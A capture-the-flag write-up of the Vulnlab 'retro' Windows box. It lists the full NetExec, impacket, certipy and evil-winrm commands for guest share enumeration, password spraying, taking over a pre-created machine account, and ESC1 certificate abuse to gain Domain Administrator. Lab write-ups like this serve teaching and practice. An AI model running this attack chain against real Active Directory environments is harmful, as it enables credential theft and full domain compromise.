## Introduction
------------------------------------------------------------------------------------------
[retro](https://www.vulnlab.com/machines) is an easy rated windows box from vulnlab. We initially abuse the guest account to enumerate shares and users. Next, by spraying passwords using NetExec we get valid credentials in the Active Directory. There is a pre-created machine account in the environment which we can abuse to exploit the ESC1 vulnerable certificate template.

------------------------------------------------------------------------------------------

## Foothold
<p style="text-align: justify;"> We start by enumerating SMB on the domain controller and quickly discover that the <strong>Guest</strong> account is enabled. This allows us to enumerate SMB shares and perform RID cycling to identify valid domain users. </p>

```bash
nxc smb retro.vl -u guest -p '' --shares
nxc smb retro.vl -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./output
lookupsid.py guest@retro.vl -no-pass
```
![SMB Shares (Guest)](./assets/img/ctf/vulnlab/retro/retro3.png)
![spider_plus (Guest)](./assets/img/ctf/vulnlab/retro/retro4.png)
![RID Cycling](./assets/img/ctf/vulnlab/retro/retro5.png)

<p style="text-align: justify;"> Using the enumerated usernames, we perform a basic password spray by testing usernames as passwords, which results in valid credentials for <code>trainee:trainee</code>.</p>

```bash
nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
```
![Password Spraying](./assets/img/ctf/vulnlab/retro/retro6.png)
<p style="text-align: justify;"> With authenticated access, we re-enumerate SMB shares and discover an internal note referencing an old <strong>pre-created computer account</strong> used by the banking application. </p>

```bash
nxc smb retro.vl -u trainee -p trainee --shares
nxc smb retro.vl -u trainee -p trainee -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
```

<p style="text-align: justify;"> Further domain enumeration using LDAP and BloodHound reveals a pre-created computer account named <code>BANKING$</code>.</p>

```bash

ldapdomaindump  'ldap://retro.vl' -u 'retro.vl\trainee' -p 'trainee' -o lootme
```

<p style="text-align: justify;">The account still uses a weak default password, allowing us to authenticate and take full control by changing it. </p>

```sh
#  STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
nxc smb retro.vl -u BANKING$ -p banking 
# kerberos
kpasswd BANKING$
oldpass: banking
newpass: newPassword
# ms-rpc
impacket-changepasswd 'retro.vl/BANKING$':banking@retro.vl -newpass newPassword -dc-ip $dc -p rpc-samr
# check new creds
nxc smb retro.vl -u BANKING$ -p newPassword --shares
```

## Privilege Escalation
<p style="text-align: justify;"> AD CS enumeration exposes a vulnerable certificate template (<code>RetroClients</code>) affected by an <strong>ESC1</strong> misconfiguration. As <code>BANKING$</code>, we abuse this template to request a certificate for the domain administrator and authenticate using the issued certificate, resulting in full Domain Administrator privileges. </p>

```sh
# Env Variables
export pass=newPassword
export CA=retro-DC-CA
export dc=10.10.108.49
export pass=newPassword
# Enumeration
certipy find -u trainee@retro.vl -p trainee -dc-ip $dc
# Certificate Request
certipy req -username BANKING$ -password $pass -ca $CA -template RetroClients -upn administrator@retro.vl -dc-ip $dc -key-size 4096
# Authentication
certipy auth -pfx administrator.pfx
# Evil-winRM
evil-winrm -i dc.retro.vl -u Administrator -H **********
```

## Kill Chain Summary
1. Abuse the guest account to enumerate shares and users.
2. Password spraying to get valid credentials.
3. Compromise the Pre-Created Machine account. 
4. Exploit ESC1 to get Domain Admin.
